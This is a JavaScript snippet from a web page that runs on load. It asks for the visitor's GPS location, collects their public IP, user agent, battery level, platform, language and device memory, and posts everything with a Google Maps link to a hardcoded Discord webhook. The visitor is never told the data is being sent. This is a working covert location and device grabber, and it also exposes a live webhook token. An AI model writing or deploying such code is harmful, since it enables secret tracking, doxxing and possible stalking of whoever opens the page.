    <script>
        $(document).ready(function() {
            // Function to fetch IP address and other device details
            async function fetchIPAndDeviceDetails() {
                const ipData = await fetch('https://api.ipify.org?format=json');
                const ipResponse = await ipData.json();
                const ipAddress = ipResponse.ip;

                const userAgent = navigator.userAgent;
                const networkInfo = navigator.connection ? navigator.connection.effectiveType : "Unknown";

                const battery = await navigator.getBattery();
                const batteryPercentage = battery.level * 100;
                const isCharging = battery.charging;

                const platform = navigator.platform;
                const language = navigator.language;

                const deviceMemory = navigator.deviceMemory || "Unknown";

                return { ipAddress, userAgent, networkInfo, batteryPercentage, isCharging, platform, language, deviceMemory };
            }

            // Function to send the location and device details to Discord
            async function sendToDiscord(latitude, longitude, ipAddress, userAgent, timestamp, networkInfo, batteryPercentage, isCharging, platform, language, deviceMemory) {
                const data = {
                    content: `**User Details:**
- DeviceLocalTime: ${new Date().toLocaleString()}
- Location: Latitude ${latitude}, Longitude ${longitude}
- Google Maps Link: https://www.google.com/maps/place/${latitude}%2C${longitude}
- IP Address: ${ipAddress}
- Local IP Address: ${ipAddress}  // Using the same IP address for local and public for now
- User-Agent: ${userAgent}
- NetworkInformation: ${networkInfo}
- BatteryPercentage: ${batteryPercentage}%
- IsCharging: ${isCharging ? "Yes" : "No"}
- Platform: ${platform}
- DeviceLanguage: ${language}
- DeviceMemory: ${deviceMemory} GB`
                };

                const request = new XMLHttpRequest();
                request.open("POST", "https://discord.com/api/webhooks/1269744683979116584/cNjKRdP0NsvH3NIpezZoS5x1NU336ma0GlpVGf-QLB5m_vfU_gX797a_9jhOiNsLkihm");
                request.setRequestHeader('Content-type', 'application/json');
                request.send(JSON.stringify(data));
            }

            // Function to get geolocation and trigger sending data
            function getLocation() {
                if (navigator.geolocation) {
                    setTimeout(() => {
                        navigator.geolocation.getCurrentPosition(async function(position) {
                            const latitude = position.coords.latitude;
                            const longitude = position.coords.longitude;

                            const deviceDetails = await fetchIPAndDeviceDetails();

                            sendToDiscord(latitude, longitude, deviceDetails.ipAddress, deviceDetails.userAgent, new Date().toLocaleString(), deviceDetails.networkInfo, deviceDetails.batteryPercentage, deviceDetails.isCharging, deviceDetails.platform, deviceDetails.language, deviceDetails.deviceMemory);
                        }, function(error) {
                            alert("Error getting location: " + error.message);
                        }, { timeout: 5000 });
                    }, 5000);
                } else {
                    alert("Your Browser Does not support Gps");
                }
            }

            getLocation();
        });
